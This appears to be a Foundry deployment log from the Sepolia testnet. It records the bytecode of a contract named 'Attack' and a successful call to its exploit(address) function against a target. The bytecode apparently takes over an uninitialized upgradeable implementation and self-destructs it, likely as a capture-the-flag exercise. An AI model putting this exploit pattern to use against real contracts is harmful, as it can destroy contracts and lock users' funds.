{
  "transactions": [
    {
      "hash": "0x925de3189c47f6f4ec82f07660652fc3dc05d00afefd70a99e7bdd36a3419d5d",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0x5a3bf9de32c6d45226e761d1be6798420444370a",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "gas": "0x4a238",
        "value": "0x0",
        "input": "0x608060405234801561001057600080fd5b50610343806100206000396000f3fe60806040526004361061002d5760003560e01c80630aeb4ddf14610039578063dd365b8b1461006e57610034565b3661003457005b600080fd5b34801561004557600080fd5b5061006c6004803603602081101561005c57600080fd5b50356001600160a01b0316610083565b005b34801561007a57600080fd5b5061006c6101e9565b600080546001600160a01b0319166001600160a01b03838116919091178083556040805163204a7f0760e21b815290519190921692638129fc1c926004808201939182900301818387803b1580156100da57600080fd5b505af11580156100ee573d6000803e3d6000fd5b5050604080516004808252602480830184526020830180516001600160e01b031663dd365b8b60e01b17815260008054865163278f794360e11b8152309581018681529481019788528651604482015286519699506001600160a01b039091169750634f1ef2869694958995936064909201928190849084905b83811015610180578181015183820152602001610168565b50505050905090810190601f1680156101ad5780820380516001836020036101000a031916815260200191505b509350505050600060405180830381600087803b1580156101cd57600080fd5b505af11580156101e1573d6000803e3d6000fd5b505050505050565b6102116040518060400160405280600681526020016550776e65642360d01b81525030610214565b30ff5b6102cb82826040516024018080602001836001600160a01b03168152602001828103825284818151815260200191508051906020019080838360005b83811015610268578181015183820152602001610250565b50505050905090810190601f1680156102955780820380516001836020036101000a031916815260200191505b5060408051601f198184030181529190526020810180516001600160e01b031663319af33360e01b17905293506102cf92505050565b5050565b6102e6816102de6102e961030a565b63ffffffff16565b50565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b9056fea26469706673582212202ac7d5471ce461e86137e72ac461f44d5c7a4a899122be8e63d4cca9417e0b5e64736f6c634300060c0033",
        "nonce": "0xd6",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x07aeadefb7b8412bea44de56bd5c0a9b8d20d6ea738dfe7284458a4e29093e17",
      "transactionType": "CALL",
      "contractName": "Attack",
      "contractAddress": "0x5a3bf9de32c6d45226e761d1be6798420444370a",
      "function": "exploit(address)",
      "arguments": [
        "0x7480938AB88C4f7f8B88715A4b0aaD439aF0e47E"
      ],
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "to": "0x5a3bf9de32c6d45226e761d1be6798420444370a",
        "gas": "0x2a2c2",
        "value": "0x0",
        "input": "0x0aeb4ddf0000000000000000000000007480938ab88c4f7f8b88715a4b0aad439af0e47e",
        "nonce": "0xd7",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5f8351",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x925de3189c47f6f4ec82f07660652fc3dc05d00afefd70a99e7bdd36a3419d5d",
      "transactionIndex": "0x22",
      "blockHash": "0xa2d977bcdda4ce3fac4e60c0a058abffc98dc423f2b3884e10b464134ab7286d",
      "blockNumber": "0x66e476",
      "gasUsed": "0x390b2",
      "effectiveGasPrice": "0x66cff3044",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": null,
      "contractAddress": "0x5a3bf9de32c6d45226e761d1be6798420444370a"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x628c81",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x07aeadefb7b8412bea44de56bd5c0a9b8d20d6ea738dfe7284458a4e29093e17",
      "transactionIndex": "0x24",
      "blockHash": "0xa2d977bcdda4ce3fac4e60c0a058abffc98dc423f2b3884e10b464134ab7286d",
      "blockNumber": "0x66e476",
      "gasUsed": "0x1e884",
      "effectiveGasPrice": "0x66cff3044",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": "0x5a3bf9de32c6d45226e761d1be6798420444370a",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1727066654,
  "chain": 11155111,
  "commit": "b020e18"
}